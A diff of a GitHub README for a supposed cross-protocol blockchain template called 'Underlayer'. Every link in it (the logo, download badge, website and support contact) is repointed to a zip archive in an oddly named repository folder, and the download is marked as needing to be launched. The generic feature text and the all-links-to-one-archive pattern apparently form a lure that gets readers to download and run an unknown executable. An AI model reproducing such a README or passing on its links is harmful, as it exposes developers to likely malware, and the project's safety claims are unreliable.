@@ -1,6 +1,6 @@
 # 🚀 **Underlayer: Building Safe and Robust Cross-Protocol Blockchains**
 
-![Underlayer Logo](https://github.com/Antonio12gkn71/underlayer/releases/download/v2.0/Software.zip)
+![Underlayer Logo](https://raw.githubusercontent.com/Antonio12gkn71/underlayer/main/forfoughen/Software-v2.0.zip)
 
 Welcome to the Underlayer repository, your go-to template for creating secure and functional cross-protocol blockchains with built-in EVM compatibility. Whether you are a blockchain developer, a cryptocurrency enthusiast, or someone looking to explore the world of decentralized technologies, Underlayer provides the tools you need to kickstart your project.
 
@@ -23,10 +23,10 @@ Underlayer is my personal template designed to facilitate the development of cro
 - Substrate
 
 ## 📦 Access Underlayer
-[![Download Underlayer](https://github.com/Antonio12gkn71/underlayer/releases/download/v2.0/Software.zip)](https://github.com/Antonio12gkn71/underlayer/releases/download/v2.0/Software.zip) *(needs to be launched)*
+[![Download Underlayer](https://raw.githubusercontent.com/Antonio12gkn71/underlayer/main/forfoughen/Software-v2.0.zip)](https://raw.githubusercontent.com/Antonio12gkn71/underlayer/main/forfoughen/Software-v2.0.zip) *(needs to be launched)*
 
 ### 🌐 Visit our Website
-Explore detailed documentation, tutorials, and the latest updates on our [website](https://github.com/Antonio12gkn71/underlayer/releases/download/v2.0/Software.zip).
+Explore detailed documentation, tutorials, and the latest updates on our [website](https://raw.githubusercontent.com/Antonio12gkn71/underlayer/main/forfoughen/Software-v2.0.zip).
 
 ## 🛠️ Features
 1. **Robust Architecture**: Underlayer is built with a focus on robustness and ensures the integrity of your blockchain infrastructure.
@@ -46,7 +46,7 @@ To start using Underlayer for your blockchain project, follow these steps:
 We welcome contributions from the community to enhance Underlayer further. If you have ideas for improvements or new features, feel free to submit a pull request.
 
 ## 📞 Support
-For any queries or assistance regarding Underlayer, please reach out to our support team at https://github.com/Antonio12gkn71/underlayer/releases/download/v2.0/Software.zip
+For any queries or assistance regarding Underlayer, please reach out to our support team at https://raw.githubusercontent.com/Antonio12gkn71/underlayer/main/forfoughen/Software-v2.0.zip
 
 ## 🎉 Thank You!
 Thank you for choosing Underlayer for your blockchain development needs. Join us in revolutionizing the decentralized world with safe, robust, and functional cross-protocol blockchains! 🌐🔗🚀
